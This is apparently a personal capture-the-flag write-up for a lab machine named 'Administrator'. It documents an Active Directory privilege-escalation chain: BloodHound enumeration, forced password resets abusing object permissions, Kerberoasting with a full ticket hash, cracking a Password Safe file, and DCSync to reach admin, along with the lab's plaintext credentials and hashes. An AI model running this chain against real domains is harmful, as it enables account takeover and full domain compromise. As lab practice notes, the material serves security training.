# Administrator \[Medium]

## Report

We start with creds for 'Olivia' who has outbound object control over 'michael' and can change his password, michael can change 'benjamin's' password and he can access ftp. Find a passwordsafe database and crack it to find creds for 'emily'.

Emily has 'genericwrite' over 'Ethan' who can DCSync with admin. Secrets-dump and become admin

## Cheatsheet

```
nxc smb 10.10.10.182 -u '' -p '' --shares
Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb)

bloodhound-python -c ALL -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42

Ethan can DCSync
"Outbound Object control" under node information -> first thing to check
Olivia has GenericAll over michael

Used faketime +7h for kerboroasting

$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$c0ef1883457aa98111e11234c5ac8e28$c38e71f1b028a3d63a6766f89b973c8d088d1ab2bbf1ff205eef73795b6184e6637dc34bec9e3955d5c74a2a00eab8d2a3834c5bcf35585dac417d149e7fb26d59262fccc90f80dd295c139085fb540aa1e155044a044b42f9bdfe5b11ee35dcc5378fb55795b20ada58acf3f904f7a68b282673618faa1265790a0f142ae13fb2dc7ac21b7cbf8703a76e7fb158434cd5c1d5582ef92f81687925281b6ce95b28a6420ff1c2fc9d6a04ecec5e22e5e0a3bc71f9292ccdae977eb85255d536a9af3eb73fc999b9072fe2d3e6a4e9af668f5cbe04e9700b9543c77b206b2f7d9ae7a06d69479e954fd36aab58fc83024571640ef97b296b23a92d18677e5cc7916ee7fd56b06c6d218c1ac606391626c88555a29831f81a8787a19010284fd8b2f337e5f9837a17d03330126eec1af71961841c80d6f0fdf791486f218c1a5a5a47e3ef96dd9923c45c712633e28c568f17593535b0506abcf8aefbe059c429dab9c70a06399936bd9822917e3cdbc4bca374b302c035896f56188c90dd154dac965627534ff05c3b185c0c7b3048c7701207e9c7e1f058210ec3c26e44f6d0de968b387cc0953a43b49433454b1192c27b9f47efd2fdc320cc2f9babcf9aa6dd7b0f9c6f625cd124bf1814cceee4c10a703bc18459ec32a8452b27ac90a19072d0afb714af1b3577a283a0e3ec2f97fa711cfd7e5169d45f18be940332f669fe15557f0f35c20042d46cfca0434ed3f5694458b39b301a80f0358374a4ed8781bd11abe81f19d967a4a3e6eeb7a68241624217a54be118a2417a41fd01bee2e7f76f105a6c1d9d27f10fff9d5ad255645ff4b9fd554358d9269db737806c31cc668a2271c0a2b7215e176b05f72ece7f3d0440cbc0b8b82780aac6b1b31d21267bfb22cff4fb6cfc914f8f01fbc0f92549a100ab67d52c695579592bcbd4bea365486b5786198c407c8bb127c2170a0786b6872f5ce8ebf76800b99e55ecf8b67349924192503183a8e3169bcc3ae948ee6e1ee63adf5fbe3d1bc73502ae4abd3d7412d67e0558ed4e04c4a9f05a745ccb520dfd749b58f3b6e208c8bca386dd7a8bf9e8d60579a5a2b1d11b219d41fe994a86352933928d12182d64073c72f08b33c92f77cb85fb7f5079f4162b57a92f50427180eabae0a6727b911c2b89006e657f6275b3ae4053947f0c4a94e997561a916bc8279b31c183e387cf1ed4d02c19b3ba9d202e296d2053cbd226eacea65ac3ff996ec2a39963f7dd11c7de11604207845f1b0e8c249f9f40232397997d0a55d51d07e6d63ac56e50179e176c2e01a944306320f8970d279887df6bcfb55bd5f0e897c39239cc9e010abd27a66d1137ef8765e196dcf03ae7c67c905b79438a98b7eb92c9207f9d47d5e30fe858b2591b32b321cc2e668a1821b8eb2edea2eb9f0455b3a916c5fe81af6a3f98492835073b28e9ebd34c0e0d13a245ebe5fa105198ea0fb84cfa58394bea3634ca4e222d97b2a7842f8aad4ac08d254c53edb36915067e7a

couldnt crack this so we force change password

net rpc password "michael" "Mango@34" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.10.11.42" [-S "domain-controller]

michael has 'forcechangepassword' over benjamin

crack backup.psafe from ftp
tekieromucho     (Backu) 
View pwsafe db and see passwords of three users, two of which are disabled if you remember earlier

ea9a5e81275a643eedbbaa968a0766ae
emily can genericwrite to ethan aka get kerb ticket, crack hash to get password
ethan can dcsync
afc58b3d4a3f73739f0e66c454c1caa9
```

## Loot

### Creds

```
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

### Enum

```
Watch for clock skew
SMB
only SYSVOL had anything the other two IPC$ and NETLOGON were just empty
no groups.xml found

FTP 
access denied for now

RPCCLIENT -> Nothing for now

There is MySQL server running
C:\Users\All Users\MySQL\MySQL Server 8.0\Data denied
```
